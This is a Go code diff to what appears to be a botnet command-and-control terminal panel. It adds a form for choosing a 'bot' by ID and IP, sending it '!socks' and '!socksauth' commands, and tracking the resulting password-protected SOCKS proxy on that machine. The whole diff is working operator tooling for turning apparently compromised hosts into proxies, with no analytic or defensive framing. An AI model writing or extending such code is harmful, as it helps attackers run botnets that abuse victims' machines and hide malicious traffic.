@@ -300,8 +300,11 @@ type TUIModel struct {
 	socksList      []SocksInfo
 	socksCursor    int
 	socksViewMode  int    // 0 = all, 1 = active, 2 = stopped
-	socksInputMode bool   // true when setting port for a bot
+	socksInputMode bool   // true when setting port/auth for a bot
+	socksInputStep int    // 0 = port, 1 = username, 2 = password
 	socksNewPort   string // Port to start socks on
+	socksNewUser   string // Optional proxy username
+	socksNewPass   string // Optional proxy password
 
 	// Quit flag
 	quitting bool
@@ -326,6 +329,8 @@ type SocksInfo struct {
 	BotID     string    // Bot running the socks
 	BotIP     string    // Bot's IP address (for connecting)
 	Port      string    // Port socks is running on
+	Username  string    // Proxy auth username (empty = no auth)
+	Password  string    // Proxy auth password
 	Status    string    // "active", "stopped"
 	StartedAt time.Time // When socks was started
 }
@@ -856,25 +861,41 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 		}
 	}
 
-	// Handle socks input mode (just port input)
+	// Handle socks input mode (port + optional user:pass)
 	if m.currentView == ViewSocks && m.socksInputMode {
 		switch key {
 		case "esc":
 			m.socksInputMode = false
+			m.socksInputStep = 0
 			m.socksNewPort = ""
+			m.socksNewUser = ""
+			m.socksNewPass = ""
+			return m, nil
+		case "tab":
+			// Cycle through fields: port -> user -> pass -> port
+			m.socksInputStep = (m.socksInputStep + 1) % 3
 			return m, nil
 		case "enter":
 			if m.socksNewPort != "" && m.socksCursor < len(m.bots) {
-				// Send !socks command to the selected bot
 				bot := m.bots[m.socksCursor]
+
+				// Send !socks command to start proxy on port
 				cmd := fmt.Sprintf("!socks %s", m.socksNewPort)
 				sendToSingleBot(bot.ID, cmd)
+
+				// If credentials provided, send !socksauth to set them
+				if m.socksNewUser != "" && m.socksNewPass != "" {
+					authCmd := fmt.Sprintf("!socksauth %s %s", m.socksNewUser, m.socksNewPass)
+					sendToSingleBot(bot.ID, authCmd)
+				}
 
 				// Track it in socksList
 				newSocks := SocksInfo{
 					BotID:     bot.ID,
 					BotIP:     bot.IP,
 					Port:      m.socksNewPort,
+					Username:  m.socksNewUser,
+					Password:  m.socksNewPass,
 					Status:    "active",
 					StartedAt: time.Now(),
 				}
@@ -887,17 +908,40 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 				}
 				m.socksList = append(m.socksList, newSocks)
 				m.socksInputMode = false
+				m.socksInputStep = 0
 				m.socksNewPort = ""
+				m.socksNewUser = ""
+				m.socksNewPass = ""
 			}
 			return m, nil
 		case "backspace":
-			if len(m.socksNewPort) > 0 {
-				m.socksNewPort = m.socksNewPort[:len(m.socksNewPort)-1]
+			switch m.socksInputStep {
+			case 0:
+				if len(m.socksNewPort) > 0 {
+					m.socksNewPort = m.socksNewPort[:len(m.socksNewPort)-1]
+				}
+			case 1:
+				if len(m.socksNewUser) > 0 {
+					m.socksNewUser = m.socksNewUser[:len(m.socksNewUser)-1]
+				}
+			case 2:
+				if len(m.socksNewPass) > 0 {
+					m.socksNewPass = m.socksNewPass[:len(m.socksNewPass)-1]
+				}
 			}
 			return m, nil
 		default:
-			if len(key) == 1 && key >= "0" && key <= "9" {
-				m.socksNewPort += key
+			if len(key) == 1 {
+				switch m.socksInputStep {
+				case 0:
+					if key >= "0" && key <= "9" {
+						m.socksNewPort += key
+					}
+				case 1:
+					m.socksNewUser += key
+				case 2:
+					m.socksNewPass += key
+				}
 			}
 			return m, nil
 		}
@@ -1053,7 +1097,10 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 		// Start socks on selected bot (in socks view)
 		if m.currentView == ViewSocks && !m.socksInputMode && len(m.bots) > 0 {
 			m.socksInputMode = true
+			m.socksInputStep = 0
 			m.socksNewPort = "1080"
+			m.socksNewUser = ""
+			m.socksNewPass = ""
 			return m, nil
 		}
 
@@ -2452,12 +2499,46 @@ func (m TUIModel) viewSocks() string {
 				neonCyan.Render(items[m.socksCursor].botID)))
 		}
 		cursor := lipgloss.NewStyle().Foreground(lipgloss.Color("46")).Render("█")
-		b.WriteString(fmt.Sprintf("  %s %s%s\n",
-			neonCyan.Render("▸ Port:"),
-			neonGreen.Render(m.socksNewPort),
-			cursor))
+		// Port field
+		portLabel := dim.Render("  Port:")
+		if m.socksInputStep == 0 {
+			portLabel = neonCyan.Render("  ▸ Port:")
+		}
+		portCursor := ""
+		if m.socksInputStep == 0 {
+			portCursor = cursor
+		}
+		b.WriteString(fmt.Sprintf("%s %s%s\n", portLabel, neonGreen.Render(m.socksNewPort), portCursor))
+		// Username field
+		userLabel := dim.Render("  User:")
+		if m.socksInputStep == 1 {
+			userLabel = neonCyan.Render("  ▸ User:")
+		}
+		userCursor := ""
+		if m.socksInputStep == 1 {
+			userCursor = cursor
+		}
+		userDisplay := m.socksNewUser
+		if userDisplay == "" && m.socksInputStep != 1 {
+			userDisplay = "(none)"
+		}
+		b.WriteString(fmt.Sprintf("%s %s%s\n", userLabel, neonGreen.Render(userDisplay), userCursor))
+		// Password field
+		passLabel := dim.Render("  Pass:")
+		if m.socksInputStep == 2 {
+			passLabel = neonCyan.Render("  ▸ Pass:")
+		}
+		passCursor := ""
+		if m.socksInputStep == 2 {
+			passCursor = cursor
+		}
+		passDisplay := strings.Repeat("*", len(m.socksNewPass))
+		if passDisplay == "" && m.socksInputStep != 2 {
+			passDisplay = "(none)"
+		}
+		b.WriteString(fmt.Sprintf("%s %s%s\n", passLabel, neonGreen.Render(passDisplay), passCursor))
 		b.WriteString("\n")
-		b.WriteString(dim.Render("  [enter] Start Socks   [esc] Cancel"))
+		b.WriteString(dim.Render("  [tab] Next field   [enter] Start   [esc] Cancel"))
 		b.WriteString("\n")
 	} else {
 		// Hotkey help
